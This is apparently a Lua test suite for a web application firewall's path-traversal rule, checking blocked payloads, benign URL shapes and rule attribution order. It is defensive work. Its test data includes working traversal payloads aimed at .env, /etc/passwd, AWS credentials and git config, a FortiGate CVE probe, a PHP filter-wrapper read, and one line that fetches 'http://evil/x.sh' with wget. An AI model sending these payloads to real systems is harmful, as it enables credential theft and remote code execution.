-- Tests for rule 101 (rule_traversal, WAF_TRAVERSAL; detect_traversal).
-- Production tier: block (promoted challenge→block 2026-09-05 after a clean
-- 6-server FP review — docs/waf.md). Pins the shipped tier, the positive
-- payload classes that review observed, and the documented negatives
-- (ellipsis slugs, FB share-debug `/.../`, a single `../` with no sensitive
-- sink) so a future "tightening" cannot silently reintroduce them.

_G.ngx = {
  now           = function() return 1000 end,
  decode_base64 = function(_) return nil end,
  log           = function(_, _) end,
  ERR           = 0, WARN = 1, INFO = 2,
}

package.path = "configs/lua/?.lua;" .. package.path
local waf = require("cfm_waf")

local fails = 0
local function check(cond, msg)
  if cond then return end
  fails = fails + 1
  io.stderr:write("FAIL: " .. msg .. "\n")
end

-- ── Shipped tier ─────────────────────────────────────────────────────────────
check(waf.get_config().rule_traversal == "block",
      "rule_traversal ships at block (got " .. tostring(waf.get_config().rule_traversal) .. ")")

-- Isolate rule 101: disable every rule, then enable only this one at block.
local function set_only(map)
  local snap = waf.get_config()
  for k, _ in pairs(snap) do
    if k:sub(1, 5) == "rule_" then waf.set_rule(k, "disabled") end
  end
  for k, m in pairs(map) do waf.set_rule(k, m) end
end
set_only({ rule_traversal = "block" })

local CHROME = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " ..
               "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

-- Build a request ctx: `uri` is the path, `args` the raw query string.
local function req(path, args)
  return { uri = path, args = args or "", method = "GET", ip = "203.0.113.50", body = "",
           headers = { ["user-agent"] = CHROME, ["accept"] = "text/html,application/xhtml+xml",
                       ["accept-language"] = "en-US", ["sec-fetch-mode"] = "navigate" } }
end

local function blocks(c, label)
  local hit, reason, _, action = waf.check(c)
  check(hit == true, label .. " — hit=true (got " .. tostring(hit) .. ")")
  check(reason == "WAF_TRAVERSAL", label .. " — reason (got " .. tostring(reason) .. ")")
  check(action == "block", label .. " — action=block (got " .. tostring(action) .. ")")
end
local function clean(c, label)
  local hit = waf.check(c)
  check(hit ~= true, label .. " — must NOT fire (got hit=" .. tostring(hit) .. ")")
end

-- ── Positives: the payload classes the 2026-09-05 review observed ────────────
-- Google-Cloud sweeps (>95 % of the volume): Vite /@fs double-encoded, Astro
-- /_image, and the `/<dir>../.env` single-hop family paired with the .env sink.
blocks(req("/@fs/..%252f..%252f..%252f..%252f..%252froot/.env", "raw??"), "Vite /@fs double-encoded ..%252f to /root/.env")
blocks(req("/@fs/..%252f..%252f..%252f..%252f..%252fproc/self/environ", "raw??"), "Vite /@fs to /proc/self/environ")
blocks(req("/_image", "href=/../../../.env"), "Astro /_image?href=/../../../.env")
blocks(req("/assets../.env"), "single ../ paired with the .env sink")
blocks(req("/js../.git/config"), "GitConfigScanner /js../.git/config")
-- Minority-country rows, all read during the review.
blocks(req("/index.php", "sl=../../../../../../../etc/passwd%00"), "null byte + /etc/passwd")
blocks(req("/", "lang=../../../../../usr/local/php/pearcmd"), "pearcmd LFI→RCE")
blocks(req("/..%5c..%5c..%5c..%5c..%5c..%5cvar/log/apache2/access.log"), "encoded backslash ..%5c multi-hop")
blocks(req("/vpn/user/download/client", "ostype=../../../../../../../../../etc/passwd"), "Citrix-style multi-hop to /etc/passwd")
blocks(req("/pms", "module=logging&file_name=../../../../../../~/.aws/credentials&number_of_lines=10000"), "multi-hop to ~/.aws/credentials")
blocks(req("/remote/fgt_lang", "lang=/../../../..//////////dev/cmdb/sslvpn_websession"), "FortiGate CVE-2018-13379 probe (multi-hop)")

-- ── Negatives: documented benign shapes stay clean ───────────────────────────
clean(req("/pro.../blouzaki-t-shirt-craft/"), "ellipsis-style CMS slug (three dots) is not traversal")
clean(req("/.../abc"), "FB share-debug /.../ (three dots) is not traversal")
clean(req("/phpThumb.php", "src=../images/products/foo.jpg"), "single ../ with no sensitive sink (phpThumb) is benign")
clean(req("/product/ring...gold-18k/"), "dots inside a slug")
clean(req("/a..b/c"), "two dots without a separator")
clean(req("/wp-content/themes/x/style.css", "ver=6.5"), "ordinary asset")

-- ── Ordering: an armed block-tier family owns the headline over traversal ────
-- rule 101 blocks but its autoblock family is held, so it runs AFTER the armed
-- families; a request carrying both a traversal marker and an RCE / wrapper
-- payload must be attributed to the armed family (that is what cfm.lua pushes
-- and what wafsec bans on). Traversal-only requests still block.
set_only({ rule_traversal = "block", rule_rce = "block", rule_php_wrappers = "block" })
local function headline(c)
  local hit, reason, _, action, hits = waf.check(c)
  return hit, reason, action, hits or {}
end
local hit, reason, action, hits = headline(req("/", "f=../../../../proc/self/environ;wget http://evil/x.sh"))
check(hit == true and action == "block", "LFI→RCE combo blocks")
check(reason == "WAF_RCE", "LFI→RCE combo: headline is the armed WAF_RCE, not the held WAF_TRAVERSAL (got " .. tostring(reason) .. ")")
hit, reason, action, hits = headline(req("/", "page=php://filter/convert.base64-encode/resource=../../../../etc/passwd"))
check(hit == true and action == "block", "wrapper-LFI combo blocks")
check(reason == "WAF_PHP_WRAPPER:WRAP_PHP", "wrapper-LFI combo: headline is WAF_PHP_WRAPPER:WRAP_PHP (got " .. tostring(reason) .. ")")
hit, reason, action = headline(req("/assets../.env"))
check(hit == true and reason == "WAF_TRAVERSAL" and action == "block", "traversal-only request still blocks as WAF_TRAVERSAL")

if fails > 0 then
  io.stderr:write(("cfm_waf traversal tests: %d FAILED\n"):format(fails))
  os.exit(1)
end
print("ok: cfm_waf rule 101 traversal (block tier, payload classes, benign negatives)")
